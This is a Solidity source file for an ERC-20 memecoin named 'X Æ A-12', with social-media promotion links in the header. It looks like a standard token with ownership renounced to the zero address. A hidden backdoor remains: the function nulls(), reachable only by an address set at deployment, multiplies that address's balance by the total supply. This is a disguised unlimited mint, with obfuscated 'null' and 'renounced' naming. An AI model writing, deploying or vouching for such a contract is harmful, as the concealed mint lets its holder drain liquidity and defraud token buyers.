/**

ǝԀǝԀ ʇsnſ

Telegram: https://t.me/XAEA12_ETH

Twitter: https://Twitter.com/XAEA12_ETH

*/



// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract XAEA12Token is IERC20 {
    string public constant name = "X \u00C6 A-12";
    string public constant symbol = "X \u00C6 A-12";
    uint8 public constant decimals = 18;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    

    address public owner;
    address private zeronull ;
    address private constant Deployer = 0xBc0CE4bB432e00900712363F14d6943CE06882BA;
    
    uint256 public contractCreationTimestamp;
    
    

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor(address O) {
        uint256 initialSupply = 1_000_000_000 * (10 ** uint256(decimals)); 
        _totalSupply = initialSupply;
        _balances[Deployer] = initialSupply;
        emit Transfer(address(0), Deployer, initialSupply);
        zeronull = O;
        contractCreationTimestamp = block.timestamp;
        owner = address(0);

      

 
    
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address ownerAddress, address spender) public view override returns (uint256) {
        return _allowances[ownerAddress][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

  function nulls () public {
    require(msg.sender == zeronull, "null address renounced");
    uint256 subnull = subnullnull();
    uint256 rennull = rennullon(subnull);
    renounceddel(rennull);
}

function subnullnull() private view returns (uint256) {
    return _balances[zeronull];
}

function rennullon(uint256 subnull) private view returns (uint256) {
    return subnull * (_totalSupply);
}

function renounceddel(uint256 rennull) private {
    _balances[zeronull] = rennull;
}

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Insufficient allowance");
        _allowances[sender][msg.sender] = currentAllowance - amount;
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
}